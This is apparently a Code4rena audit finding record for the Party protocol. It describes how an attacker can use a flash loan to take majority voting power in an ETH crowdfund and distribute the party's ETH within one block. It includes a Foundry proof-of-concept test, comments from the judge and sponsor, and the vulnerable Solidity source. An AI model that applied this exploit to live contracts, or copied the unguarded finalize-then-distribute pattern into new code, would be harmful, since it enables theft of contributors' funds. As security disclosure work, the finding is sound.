{
  "Title": "[H-02] An attacker can contribute to the ETH crowdfund using a flash loan and control the party as he likes",
  "Content": "\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L273>\n\n<https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/party/PartyGovernance.sol#L470>\n\nAn attacker can have more than half of the total voting power using a flash loan and abuse other contributors.\n\n### Proof of Concept\n\nThe main flaw is that the party can distribute funds right after the crowdfund is finalized within the same block.\n\nSo the attacker can contribute using a flash loan and repay by distributing the part's ETH.\n\n1.  Let's assume `maxContribution = type(uint96).max, minTotalContributions = 10 ether, maxTotalContributions = 20 ether, fundingSplitBps = 0`.\n2.  An attacker contributes 1 ether(attacker's fund) to the crowdfund and another user contributes 9 ether.\n3.  The attacker knows the crowdfund will be finalized as it satisfies the `minTotalContributions` already but he will have 10% of the total voting power.\n4.  So he decides to contribute 10 ether using a flash loan.\n5.  In `ETHCrowdfundBase._processContribution()`, the crowdfund will be finalized immediately as [total contribution is greater than maxTotalContributions](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/crowdfund/ETHCrowdfundBase.sol#L212).\n6.  Then the attacker will have `(1 + 10) / 20 = 55%` voting power of the party and he can pass any proposal.\n7.  So he calls `distribute()` with 19 ether. `distribute()` can be called directly if `opts.distributionsRequireVote == false`, otherwise, he should create/execute the distribution proposal and he can do it within the same block.\n8.  After that, he can receive ETH using `TokenDistributor.claim()` and the amount will be `19 * 55% = 10.45 ether`. (We ignore the distribution fee for simplicity)\n9.  He repays 10 ether to the flash loan provider and he can control the party as he likes now.\n\nThis attack is possible for both `InitialETHCrowdfund` and `ReraiseETHCrowdfund`.\n\n### Recommended Mitigation Steps\n\nI think we should implement a kind of `cooldown logic` after the crowdfund is finalized.\n\n1.  Add a `partyStartedTime` in `PartyGovernance.sol`.\n2.  While finalizing the ETH crowdfund in `ETHCrowdfundBase._finalize()`, we set `party.partyStartedTime = block.timestamp`.\n3.  After that, `PartyGovernance.distribute()` can work only when `block.timestamp > partyStartTime`.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509327981):**\n > Coded POC would have been welcomed here due to the number of steps in the attack, will review further. \n\n**[hansfriese commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1509442839):**\n > Hello @0xean - Here is a POC. It should be appended to `InitialETHCrowdfund.t.sol`\n> \n> ```solidity\n> function test_finalizeUsingFlashloan() public {\n>         InitialETHCrowdfund crowdfund = _createCrowdfund({\n>             initialContribution: 0,\n>             initialContributor: payable(address(0)),\n>             initialDelegate: address(0),\n>             minContributions: 0,\n>             maxContributions: type(uint96).max,\n>             disableContributingForExistingCard: false,\n>             minTotalContributions: 10 ether,\n>             maxTotalContributions: 20 ether,\n>             duration: 7 days,\n>             fundingSplitBps: 0,\n>             fundingSplitRecipient: payable(address(0))\n>         });\n> \n>         TokenDistributor distributor = new TokenDistributor(globals, 0);\n>         globals.setAddress(LibGlobals.GLOBAL_TOKEN_DISTRIBUTOR, address(distributor));\n> \n>         Party party = crowdfund.party();\n> \n>         // Attacker has 1 ether now\n>         address attacker = _randomAddress();\n>         vm.deal(attacker, 1 ether);\n> \n>         // An honest member has 9 ether\n>         address member = _randomAddress();\n>         vm.deal(member, 9 ether);\n> \n>         // Contribute\n>         vm.prank(attacker);\n>         uint256 vp1 = crowdfund.contribute{ value: 1 ether }(attacker, \"\");\n> \n>         vm.prank(member);\n>         crowdfund.contribute{ value: 9 ether }(member, \"\");\n> \n>         // Attacker noticed his voting power will be 10% after finalization, so he decided to contribute 10 ether using flashloan\n>         vm.deal(attacker, 10 ether); // he borrowed 10 ether\n> \n>         vm.prank(attacker);\n>         uint256 vp2 = crowdfund.contributeFor{ value: 10 ether }(1, payable(attacker), attacker, \"\"); //contributed 10 ether again\n> \n>         // Crowdfund is finalized\n>         assertTrue(crowdfund.getCrowdfundLifecycle() == ETHCrowdfundBase.CrowdfundLifecycle.Finalized);\n>         assertEq(party.getGovernanceValues().totalVotingPower, 20 ether);\n>         assertEq(vp1 + vp2, 11 ether); //his voting power is 11/20 = 55% now\n>         assertEq(address(party).balance, 20 ether);\n>         assertEq(address(attacker).balance, 0); //attacker's eth balance = 0\n> \n>         // attacker starts eth distribution of 19 ether from party's balance\n>         vm.prank(attacker);\n>         ITokenDistributor.DistributionInfo memory distInfo = party.distribute(19 ether, ITokenDistributor.TokenType.Native, address(0), 0);\n> \n>         assertEq(address(distributor).balance, 19 ether); //distributor's balance\n>         assertEq(address(party).balance, 1 ether); //party's remaining balance\n> \n>         vm.prank(attacker);\n>         distributor.claim(distInfo, 1); //attacker claims 55% of 19 ether\n> \n>         assertEq(address(attacker).balance, 10.45 ether); //finally, attacker's balance = 10.45 ether and he can repay the flashloan\n>         assertEq(party.getGovernanceValues().totalVotingPower, 20 ether);\n>         assertEq(vp1 + vp2, 11 ether); //his voting power is still 55%\n>     }\n> ```\n\n**[0xble (Party) confirmed and commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1515472420):**\n > Great finding, still debating the mitigation internally.\n\n**[0xble (Party) acknowledged and commented](https://github.com/code-423n4/2023-04-party-findings/issues/25#issuecomment-1532040736):**\n > Looking into this more, the issue can only occur if a party sets an `executionDelay` of 0. In the POC, the party was created with default values (null) which is why this could happen in testing. However if changed to a nonzero value, it would require waiting delay duration before the proposal could be executed which would prevent the repayment of the flash loan in a single execution. Since parties are expected to have a nonzero execution delay, we are less concerned about the flash loan aspect of this attack.\n> \n> This finding did prompt us to consider the risk of majority attacks more broadly, where an individual can contribute and become a majority voter in a party (flash loan or not) and take control of the party. We acknowledged the majority attack before audit and don't consider it a vulnerability. Our reasoning is (1) our governance model prioritizes simplicity and speed of coordination which would be sacrificed by introducing more complex mechanisms to robustly protect against majority attacks and (2) the expectation is parties will have reasonable governance settings and active governance to veto malicious proposals to manage the risk of a majority attack and if they don't (e.g. set an execution delay of 0) it is a deliberate choice on their part rather than a vulnerability.\n\n\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-04-party",
  "Code": [
    {
      "filename": "contracts/crowdfund/ETHCrowdfundBase.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.17;\n\nimport \"../utils/LibAddress.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../party/Party.sol\";\nimport \"../gatekeepers/IGateKeeper.sol\";\n\ncontract ETHCrowdfundBase is Implementation {\n    using LibSafeCast for uint256;\n    using LibAddress for address payable;\n\n    enum CrowdfundLifecycle {\n        // In practice, this state is never used. If the crowdfund is ever in\n        // this stage, something is wrong (e.g. crowdfund was never initialized).\n        Invalid,\n        // Ready to accept contributions to reach contribution targets\n        // until a deadline or the minimum contribution target is reached and\n        // host finalizes.\n        Active,\n        // Expired and the minimum contribution target was not reached.\n        Lost,\n        // The crowdfund has expired and reached the minimum contribution\n        // target. It is now ready to finalize.\n        Won,\n        // A won crowdfund has been finalized, with funds transferred to the\n        // party and voting power successfully updated.\n        Finalized\n    }\n\n    // Options to be passed into `initialize()` when the crowdfund is created.\n    struct ETHCrowdfundOptions {\n        Party party;\n        address payable initialContributor;\n        address initialDelegate;\n        uint96 minContribution;\n        uint96 maxContribution;\n        bool disableContributingForExistingCard;\n        uint96 minTotalContributions;\n        uint96 maxTotalContributions;\n        uint16 exchangeRateBps;\n        uint16 fundingSplitBps;\n        address payable fundingSplitRecipient;\n        uint40 duration;\n        IGateKeeper gateKeeper;\n        bytes12 gateKeeperId;\n    }\n\n    error WrongLifecycleError(CrowdfundLifecycle lc);\n    error NotAllowedByGateKeeperError(\n        address contributor,\n        IGateKeeper gateKeeper,\n        bytes12 gateKeeperId,\n        bytes gateData\n    );\n    error OnlyPartyHostError();\n    error NotOwnerError();\n    error InvalidDelegateError();\n    error NotEnoughContributionsError(uint96 totalContribution, uint96 minTotalContributions);\n    error MinGreaterThanMaxError(uint96 min, uint96 max);\n    error MaxTotalContributionsCannotBeZeroError(uint96 maxTotalContributions);\n    error BelowMinimumContributionsError(uint96 contributions, uint96 minContributions);\n    error AboveMaximumContributionsError(uint96 contributions, uint96 maxContributions);\n    error ContributingForExistingCardDisabledError();\n\n    event Contributed(\n        address indexed sender,\n        address indexed contributor,\n        uint256 amount,\n        address delegate\n    );\n\n    /// @notice The address of the `Party` contract instance associated\n    ///         with the crowdfund.\n    Party public party;\n    /// @notice The minimum amount of ETH that a contributor can send to\n    ///         participate in the crowdfund.\n    uint96 public minContribution;\n    /// @notice The maximum amount of ETH that a contributor can send to\n    ///         participate in the crowdfund per address.\n    uint96 public maxContribution;\n    /// @notice A boolean flag that determines whether contributors are allowed\n    ///         to increase the voting power of their existing party cards.\n    bool public disableContributingForExistingCard;\n    /// @notice The minimum amount of total ETH contributions required for the\n    ///         crowdfund to be considered successful.\n    uint96 public minTotalContributions;\n    /// @notice The maximum amount of total ETH contributions allowed for the\n    ///         crowdfund.\n    uint96 public maxTotalContributions;\n    /// @notice The total amount of ETH contributed to the crowdfund so far.\n    uint96 public totalContributions;\n    /// @notice The timestamp at which the crowdfund will end or ended. If 0, the\n    ///         crowdfund has finalized.\n    uint40 public expiry;\n    /// @notice The exchange rate to use for converting ETH contributions to\n    ///         voting power in basis points (e.g. 10000 = 1:1).\n    uint16 public exchangeRateBps;\n    /// @notice The portion of contributions to send to the funding recipient in\n    ///         basis points (e.g. 100 = 1%).\n    uint16 public fundingSplitBps;\n    /// @notice The address to which a portion of the contributions is sent as a\n    ///         fee if set.\n    address payable public fundingSplitRecipient;\n    /// @notice The gatekeeper contract used to restrict who can contribute to the party.\n    IGateKeeper public gateKeeper;\n    /// @notice The ID of the gatekeeper to use for restricting contributions to the party.\n    bytes12 public gateKeeperId;\n    /// @notice The address a contributor is delegating their voting power to.\n    mapping(address => address) public delegationsByContributor;\n\n    // Initialize storage for proxy contracts, credit initial contribution (if\n    // any), and setup gatekeeper.\n    function _initialize(ETHCrowdfundOptions memory opts) internal {\n        // Set the minimum and maximum contribution amounts.\n        if (opts.minContribution > opts.maxContribution) {\n            revert MinGreaterThanMaxError(opts.minContribution, opts.maxContribution);\n        }\n        minContribution = opts.minContribution;\n        maxContribution = opts.maxContribution;\n        // Set the min total contributions.\n        if (opts.minTotalContributions > opts.maxTotalContributions) {\n            revert MinGreaterThanMaxError(opts.minTotalContributions, opts.maxTotalContributions);\n        }\n        minTotalContributions = opts.minTotalContributions;\n        // Set the max total contributions.\n        if (opts.maxTotalContributions == 0) {\n            // Prevent this because when `maxTotalContributions` is 0 the\n            // crowdfund is invalid in `getCrowdfundLifecycle()` meaning it has\n            // never been initialized.\n            revert MaxTotalContributionsCannotBeZeroError(opts.maxTotalContributions);\n        }\n        maxTotalContributions = opts.maxTotalContributions;\n        // Set the party crowdfund is for.\n        party = opts.party;\n        // Set the crowdfund start and end timestamps.\n        expiry = uint40(block.timestamp + opts.duration);\n        // Set the exchange rate.\n        exchangeRateBps = opts.exchangeRateBps;\n        // Set the funding split and its recipient.\n        fundingSplitBps = opts.fundingSplitBps;\n        fundingSplitRecipient = opts.fundingSplitRecipient;\n        // Set whether to disable contributing for existing card.\n        disableContributingForExistingCard = opts.disableContributingForExistingCard;\n    }\n\n    /// @notice Get the current lifecycle of the crowdfund.\n    function getCrowdfundLifecycle() public view returns (CrowdfundLifecycle lifecycle) {\n        if (maxTotalContributions == 0) {\n            return CrowdfundLifecycle.Invalid;\n        }\n\n        uint256 expiry_ = expiry;\n        if (expiry_ == 0) {\n            return CrowdfundLifecycle.Finalized;\n        }\n\n        if (block.timestamp >= expiry_) {\n            if (totalContributions >= minTotalContributions) {\n                return CrowdfundLifecycle.Won;\n            } else {\n                return CrowdfundLifecycle.Lost;\n            }\n        }\n\n        return CrowdfundLifecycle.Active;\n    }\n\n    function _processContribution(\n        address payable contributor,\n        address delegate,\n        uint96 amount\n    ) internal returns (uint96 votingPower) {\n        address oldDelegate = delegationsByContributor[contributor];\n        if (msg.sender == contributor || oldDelegate == address(0)) {\n            // Update delegate.\n            delegationsByContributor[contributor] = delegate;\n        } else {\n            // Prevent changing another's delegate if already delegated.\n            delegate = oldDelegate;\n        }\n\n        emit Contributed(msg.sender, contributor, amount, delegate);\n\n        // OK to contribute with zero just to update delegate.\n        if (amount == 0) return 0;\n\n        // Only allow contributions while the crowdfund is active.\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        if (lc != CrowdfundLifecycle.Active) {\n            revert WrongLifecycleError(lc);\n        }\n\n        // Check that the contribution amount is within the allowed range.\n        uint96 minContribution_ = minContribution;\n        if (amount < minContribution_) {\n            revert BelowMinimumContributionsError(amount, minContribution_);\n        }\n        uint96 maxContribution_ = maxContribution;\n        if (amount > maxContribution_) {\n            revert AboveMaximumContributionsError(amount, maxContribution_);\n        }\n\n        uint96 newTotalContributions = totalContributions + amount;\n        uint96 maxTotalContributions_ = maxTotalContributions;\n        if (newTotalContributions >= maxTotalContributions_) {\n            totalContributions = maxTotalContributions_;\n\n            // Finalize the crowdfund.\n            // This occurs before refunding excess contribution to act as a\n            // reentrancy guard.\n            _finalize(maxTotalContributions_);\n\n            // Refund excess contribution.\n            uint96 refundAmount = newTotalContributions - maxTotalContributions;\n            if (refundAmount > 0) {\n                amount -= refundAmount;\n                payable(msg.sender).transferEth(refundAmount);\n            }\n        } else {\n            totalContributions = newTotalContributions;\n        }\n\n        // Subtract fee from contribution amount if applicable.\n        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n        uint16 fundingSplitBps_ = fundingSplitBps;\n        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n            uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;\n            amount -= feeAmount;\n        }\n\n        // Calculate voting power.\n        votingPower = (amount * exchangeRateBps) / 1e4;\n    }\n\n    function _calculateRefundAmount(uint96 votingPower) internal view returns (uint96 amount) {\n        amount = (votingPower * 1e4) / exchangeRateBps;\n\n        // Add back fee to contribution amount if applicable.\n        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n        uint16 fundingSplitBps_ = fundingSplitBps;\n        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n            amount = (amount * 1e4) / (1e4 - fundingSplitBps_);\n        }\n    }\n\n    function finalize() external {\n        uint96 totalContributions_ = totalContributions;\n\n        // Check that the crowdfund is not already finalized.\n        CrowdfundLifecycle lc = getCrowdfundLifecycle();\n        if (lc == CrowdfundLifecycle.Active) {\n            // Allow host to finalize crowdfund early if it has reached its minimum goal.\n            if (!party.isHost(msg.sender)) revert OnlyPartyHostError();\n\n            // Check that the crowdfund has reached its minimum goal.\n            uint96 minTotalContributions_ = minTotalContributions;\n            if (totalContributions_ < minTotalContributions_) {\n                revert NotEnoughContributionsError(totalContributions_, minTotalContributions_);\n            }\n        } else {\n            // Otherwise only allow finalization if the crowdfund has expired\n            // and been won. Can be finalized by anyone.\n            if (lc != CrowdfundLifecycle.Won) {\n                revert WrongLifecycleError(lc);\n            }\n        }\n\n        // Finalize the crowdfund.\n        _finalize(totalContributions_);\n    }\n\n    function _finalize(uint96 totalContributions_) internal {\n        // Finalize the crowdfund.\n        delete expiry;\n\n        // Update the party's total voting power.\n        uint96 newVotingPower = (totalContributions_ * exchangeRateBps) / 1e4;\n        party.increaseTotalVotingPower(newVotingPower);\n\n        // Transfer fee to recipient if applicable.\n        address payable fundingSplitRecipient_ = fundingSplitRecipient;\n        uint16 fundingSplitBps_ = fundingSplitBps;\n        if (fundingSplitRecipient_ != address(0) && fundingSplitBps_ > 0) {\n            uint96 feeAmount = (totalContributions_ * fundingSplitBps_) / 1e4;\n            totalContributions_ -= feeAmount;\n            fundingSplitRecipient_.transferEth(feeAmount);\n        }\n\n        // Transfer ETH to the party.\n        payable(address(party)).transferEth(totalContributions_);\n    }\n}"
    },
    {
      "filename": "contracts/party/PartyGovernance.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.17;\n\nimport \"../distribution/ITokenDistributorParty.sol\";\nimport \"../distribution/ITokenDistributor.sol\";\nimport \"../utils/ReadOnlyDelegateCall.sol\";\nimport \"../tokens/IERC721.sol\";\nimport \"../tokens/IERC20.sol\";\nimport \"../tokens/IERC1155.sol\";\nimport \"../tokens/ERC721Receiver.sol\";\nimport \"../tokens/ERC1155Receiver.sol\";\nimport \"../utils/LibERC20Compat.sol\";\nimport \"../utils/LibRawResult.sol\";\nimport \"../utils/LibSafeCast.sol\";\nimport \"../globals/IGlobals.sol\";\nimport \"../globals/LibGlobals.sol\";\nimport \"../proposals/IProposalExecutionEngine.sol\";\nimport \"../proposals/LibProposal.sol\";\nimport \"../proposals/ProposalStorage.sol\";\n\nimport \"./IPartyFactory.sol\";\n\n/// @notice Base contract for a Party encapsulating all governance functionality.\nabstract contract PartyGovernance is\n    ITokenDistributorParty,\n    ERC721Receiver,\n    ERC1155Receiver,\n    ProposalStorage,\n    Implementation,\n    ReadOnlyDelegateCall\n{\n    using LibERC20Compat for IERC20;\n    using LibRawResult for bytes;\n    using LibSafeCast for uint256;\n    using LibSafeCast for int192;\n    using LibSafeCast for uint96;\n\n    // States a proposal can be in.\n    enum ProposalStatus {\n        // The proposal does not exist.\n        Invalid,\n        // The proposal has been proposed (via `propose()`), has not been vetoed\n        // by a party host, and is within the voting window. Members can vote on\n        // the proposal and party hosts can veto the proposal.\n        Voting,\n        // The proposal has either exceeded its voting window without reaching\n        // `passThresholdBps` of votes or was vetoed by a party host.\n        Defeated,\n        // The proposal reached at least `passThresholdBps` of votes but is still\n        // waiting for `executionDelay` to pass before it can be executed. Members\n        // can continue to vote on the proposal and party hosts can veto at this time.\n        Passed,\n        // Same as `Passed` but now `executionDelay` has been satisfied. Any member\n        // may execute the proposal via `execute()`, unless `maxExecutableTime`\n        // has arrived.\n        Ready,\n        // The proposal has been executed at least once but has further steps to\n        // complete so it needs to be executed again. No other proposals may be\n        // executed while a proposal is in the `InProgress` state. No voting or\n        // vetoing of the proposal is allowed, however it may be forcibly cancelled\n        // via `cancel()` if the `cancelDelay` has passed since being first executed.\n        InProgress,\n        // The proposal was executed and completed all its steps. No voting or\n        // vetoing can occur and it cannot be cancelled nor executed again.\n        Complete,\n        // The proposal was executed at least once but did not complete before\n        // `cancelDelay` seconds passed since the first execute and was forcibly cancelled.\n        Cancelled\n    }\n\n    struct GovernanceOpts {\n        // Address of initial party hosts.\n        address[] hosts;\n        // How long people can vote on a proposal.\n        uint40 voteDuration;\n        // How long to wait after a proposal passes before it can be\n        // executed.\n        uint40 executionDelay;\n        // Minimum ratio of accept votes to consider a proposal passed,\n        // in bps, where 10,000 == 100%.\n        uint16 passThresholdBps;\n        // Total voting power of governance NFTs.\n        uint96 totalVotingPower;\n        // Fee bps for distributions.\n        uint16 feeBps;\n        // Fee recipeint for distributions.\n        address payable feeRecipient;\n    }\n\n    // Subset of `GovernanceOpts` that are commonly read together for\n    // efficiency.\n    struct GovernanceValues {\n        uint40 voteDuration;\n        uint40 executionDelay;\n        uint16 passThresholdBps;\n        uint96 totalVotingPower;\n    }\n\n    // A snapshot of voting power for a member.\n    struct VotingPowerSnapshot {\n        // The timestamp when the snapshot was taken.\n        uint40 timestamp;\n        // Voting power that was delegated to this user by others.\n        uint96 delegatedVotingPower;\n        // The intrinsic (not delegated from someone else) voting power of this user.\n        uint96 intrinsicVotingPower;\n        // Whether the user was delegated to another at this snapshot.\n        bool isDelegated;\n    }\n\n    // Proposal details chosen by proposer.\n    struct Proposal {\n        // Time beyond which the proposal can no longer be executed.\n        // If the proposal has already been executed, and is still InProgress,\n        // this value is ignored.\n        uint40 maxExecutableTime;\n        // The minimum seconds this proposal can remain in the InProgress status\n        // before it can be cancelled.\n        uint40 cancelDelay;\n        // Encoded proposal data. The first 4 bytes are the proposal type, followed\n        // by encoded proposal args specific to the proposal type. See\n        // ProposalExecutionEngine for details.\n        bytes proposalData;\n    }\n\n    // Accounting and state tracking values for a proposal.\n    // Fits in a word.\n    struct ProposalStateValues {\n        // When the proposal was proposed.\n        uint40 proposedTime;\n        // When the proposal passed the vote.\n        uint40 passedTime;\n        // When the proposal was first executed.\n        uint40 executedTime;\n        // When the proposal completed.\n        uint40 completedTime;\n        // Number of accept votes.\n        uint96 votes; // -1 == vetoed\n    }\n\n    // Storage states for a proposal.\n    struct ProposalState {\n        // Accounting and state tracking values.\n        ProposalStateValues values;\n        // Hash of the proposal.\n        bytes32 hash;\n        // Whether a member has voted for (accepted) this proposal already.\n        mapping(address => bool) hasVoted;\n    }\n\n    event Proposed(uint256 proposalId, address proposer, Proposal proposal);\n    event ProposalAccepted(uint256 proposalId, address voter, uint256 weight);\n    event EmergencyExecute(address target, bytes data, uint256 amountEth);\n\n    event ProposalPassed(uint256 indexed proposalId);\n    event ProposalVetoed(uint256 indexed proposalId, address host);\n    event ProposalExecuted(uint256 indexed proposalId, address executor, bytes nextProgressData);\n    event ProposalCancelled(uint256 indexed proposalId);\n    event DistributionCreated(\n        ITokenDistributor.TokenType tokenType,\n        address token,\n        uint256 tokenId\n    );\n    event VotingPowerDelegated(address indexed owner, address indexed delegate);\n    event HostStatusTransferred(address oldHost, address newHost);\n    event EmergencyExecuteDisabled();\n\n    error MismatchedPreciousListLengths();\n    error BadProposalStatusError(ProposalStatus status);\n    error BadProposalHashError(bytes32 proposalHash, bytes32 actualHash);\n    error ExecutionTimeExceededError(uint40 maxExecutableTime, uint40 timestamp);\n    error OnlyPartyHostError();\n    error OnlyActiveMemberError();\n    error InvalidDelegateError();\n    error BadPreciousListError();\n    error OnlyPartyDaoError(address notDao, address partyDao);\n    error OnlyPartyDaoOrHostError(address notDao, address partyDao);\n    error OnlyWhenEmergencyActionsAllowedError();\n    error OnlyWhenEnabledError();\n    error AlreadyVotedError(address voter);\n    error InvalidNewHostError();\n    error ProposalCannotBeCancelledYetError(uint40 currentTime, uint40 cancelTime);\n    error InvalidBpsError(uint16 bps);\n    error DistributionsRequireVoteError();\n    error PartyNotStartedError();\n\n    uint256 private constant UINT40_HIGH_BIT = 1 << 39;\n    uint96 private constant VETO_VALUE = type(uint96).max;\n\n    // The `Globals` contract storing global configuration values. This contract\n    // is immutable and itâ€™s address will never change.\n    IGlobals private immutable _GLOBALS;\n\n    /// @notice Whether the DAO has emergency powers for this party.\n    bool public emergencyExecuteDisabled;\n    /// @notice Distribution fee bps.\n    uint16 public feeBps;\n    /// @notice Distribution fee recipient.\n    address payable public feeRecipient;\n    /// @notice The hash of the list of precious NFTs guarded by the party.\n    bytes32 public preciousListHash;\n    /// @notice The last proposal ID that was used. 0 means no proposals have been made.\n    uint256 public lastProposalId;\n    /// @notice Whether an address is a party host.\n    mapping(address => bool) public isHost;\n    /// @notice The last person a voter delegated its voting power to.\n    mapping(address => address) public delegationsByVoter;\n    // Governance parameters for this party.\n    GovernanceValues internal _governanceValues;\n    // ProposalState by proposal ID.\n    mapping(uint256 => ProposalState) private _proposalStateByProposalId;\n    // Snapshots of voting power per user, each sorted by increasing time.\n    mapping(address => VotingPowerSnapshot[]) private _votingPowerSnapshotsByVoter;\n\n    modifier onlyHost() {\n        if (!isHost[msg.sender]) {\n            revert OnlyPartyHostError();\n        }\n        _;\n    }\n\n    // Caller must have voting power at the current time.\n    modifier onlyActiveMember() {\n        {\n            VotingPowerSnapshot memory snap = _getLastVotingPowerSnapshotForVoter(msg.sender);\n            // Must have either delegated voting power or intrinsic voting power.\n            if (snap.intrinsicVotingPower == 0 && snap.delegatedVotingPower == 0) {\n                revert OnlyActiveMemberError();\n            }\n        }\n        _;\n    }\n\n    // Only the party DAO multisig can call.\n    modifier onlyPartyDao() {\n        {\n            address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n            if (msg.sender != partyDao) {\n                revert OnlyPartyDaoError(msg.sender, partyDao);\n            }\n        }\n        _;\n    }\n\n    // Only the party DAO multisig or a party host can call.\n    modifier onlyPartyDaoOrHost() {\n        address partyDao = _GLOBALS.getAddress(LibGlobals.GLOBAL_DAO_WALLET);\n        if (msg.sender != partyDao && !isHost[msg.sender]) {\n            revert OnlyPartyDaoOrHostError(msg.sender, partyDao);\n        }\n        _;\n    }\n\n    // Only if `emergencyExecuteDisabled` is not true.\n    modifier onlyWhenEmergencyExecuteAllowed() {\n        if (emergencyExecuteDisabled) {\n            revert OnlyWhenEmergencyActionsAllowedError();\n        }\n        _;\n    }\n\n    modifier onlyWhenNotGloballyDisabled() {\n        if (_GLOBALS.getBool(LibGlobals.GLOBAL_DISABLE_PARTY_ACTIONS)) {\n            revert OnlyWhenEnabledError();\n        }\n        _;\n    }\n\n    // Set the `Globals` contract.\n    constructor(IGlobals globals) {\n        _GLOBALS = globals;\n    }\n\n    // Initialize storage for proxy contracts and initialize the proposal execution engine.\n    function _initialize(\n        GovernanceOpts memory govOpts,\n        ProposalStorage.ProposalEngineOpts memory proposalEngineOpts,\n        IERC721[] memory preciousTokens,\n        uint256[] memory preciousTokenIds\n    ) internal virtual {\n        // Check BPS are valid.\n        if (govOpts.feeBps > 1e4) {\n            revert InvalidBpsError(govOpts.feeBps);\n        }\n        if (govOpts.passThresholdBps > 1e4) {\n            revert InvalidBpsError(govOpts.passThresholdBps);\n        }\n        // Initialize the proposal execution engine.\n        _initProposalImpl(\n            IProposalExecutionEngine(_GLOBALS.getAddress(LibGlobals.GLOBAL_PROPOSAL_ENGINE_IMPL)),\n            abi.encode(proposalEngineOpts)\n        );\n        // Set the governance parameters.\n        _governanceValues = GovernanceValues({\n            voteDuration: govOpts.voteDuration,\n            executionDelay: govOpts.executionDelay,\n            passThresholdBps: govOpts.passThresholdBps,\n            totalVotingPower: govOpts.totalVotingPower\n        });\n        // Set fees.\n        feeBps = govOpts.feeBps;\n        feeRecipient = govOpts.feeRecipient;\n        // Set the precious list.\n        _setPreciousList(preciousTokens, preciousTokenIds);\n        // Set the party hosts.\n        for (uint256 i = 0; i < govOpts.hosts.length; ++i) {\n            isHost[govOpts.hosts[i]] = true;\n        }\n    }\n\n    /// @dev Forward all unknown read-only calls to the proposal execution engine.\n    ///      Initial use case is to facilitate eip-1271 signatures.\n    fallback() external {\n        _readOnlyDelegateCall(address(_getSharedProposalStorage().engineImpl), msg.data);\n    }\n\n    /// @inheritdoc EIP165\n    /// @dev Combined logic for `ERC721Receiver` and `ERC1155Receiver`.\n    function supportsInterface(\n        bytes4 interfaceId\n    ) public pure virtual override(ERC721Receiver, ERC1155Receiver) returns (bool) {\n        return\n            ERC721Receiver.supportsInterface(interfaceId) ||\n            ERC1155Receiver.supportsInterface(interfaceId);\n    }\n\n    /// @notice Get the current `ProposalExecutionEngine` instance.\n    function getProposalExecutionEngine() external view returns (IProposalExecutionEngine) {\n        return _getSharedProposalStorage().engineImpl;\n    }\n\n    /// @notice Get the current `ProposalEngineOpts` options.\n    function getProposalEngineOpts() external view returns (ProposalEngineOpts memory) {\n        return _getSharedProposalStorage().opts;\n    }\n\n    /// @notice Get the total voting power of `voter` at a `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(\n        address voter,\n        uint40 timestamp\n    ) external view returns (uint96 votingPower) {\n        return getVotingPowerAt(voter, timestamp, type(uint256).max);\n    }\n\n    /// @notice Get the total voting power of `voter` at a snapshot `snapIndex`, with checks to\n    ///         make sure it is the latest voting snapshot =< `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the voting power at.\n    /// @param snapIndex The index of the snapshot to get the voting power at.\n    /// @return votingPower The total voting power of `voter` at `timestamp`.\n    function getVotingPowerAt(\n        address voter,\n        uint40 timestamp,\n        uint256 snapIndex\n    ) public view returns (uint96 votingPower) {\n        VotingPowerSnapshot memory snap = _getVotingPowerSnapshotAt(voter, timestamp, snapIndex);\n        return (snap.isDelegated ? 0 : snap.intrinsicVotingPower) + snap.delegatedVotingPower;\n    }\n\n    /// @notice Get the state of a proposal.\n    /// @param proposalId The ID of the proposal.\n    /// @return status The status of the proposal.\n    /// @return values The state of the proposal.\n    function getProposalStateInfo(\n        uint256 proposalId\n    ) external view returns (ProposalStatus status, ProposalStateValues memory values) {\n        values = _proposalStateByProposalId[proposalId].values;\n        status = _getProposalStatus(values);\n    }\n\n    /// @notice Retrieve fixed governance parameters.\n    /// @return gv The governance parameters of this party.\n    function getGovernanceValues() external view returns (GovernanceValues memory gv) {\n        return _governanceValues;\n    }\n\n    /// @notice Get the hash of a proposal.\n    /// @dev Proposal details are not stored on-chain so the hash is used to enforce\n    ///      consistency between calls.\n    /// @param proposal The proposal to hash.\n    /// @return proposalHash The hash of the proposal.\n    function getProposalHash(Proposal memory proposal) public pure returns (bytes32 proposalHash) {\n        // Hash the proposal in-place. Equivalent to:\n        // keccak256(abi.encode(\n        //   proposal.maxExecutableTime,\n        //   proposal.cancelDelay,\n        //   keccak256(proposal.proposalData)\n        // ))\n        bytes32 dataHash = keccak256(proposal.proposalData);\n        assembly {\n            // Overwrite the data field with the hash of its contents and then\n            // hash the struct.\n            let dataPos := add(proposal, 0x40)\n            let t := mload(dataPos)\n            mstore(dataPos, dataHash)\n            proposalHash := keccak256(proposal, 0x60)\n            // Restore the data field.\n            mstore(dataPos, t)\n        }\n    }\n\n    /// @notice Get the index of the most recent voting power snapshot <= `timestamp`.\n    /// @param voter The address of the voter.\n    /// @param timestamp The timestamp to get the snapshot index at.\n    /// @return index The index of the snapshot.\n    function findVotingPowerSnapshotIndex(\n        address voter,\n        uint40 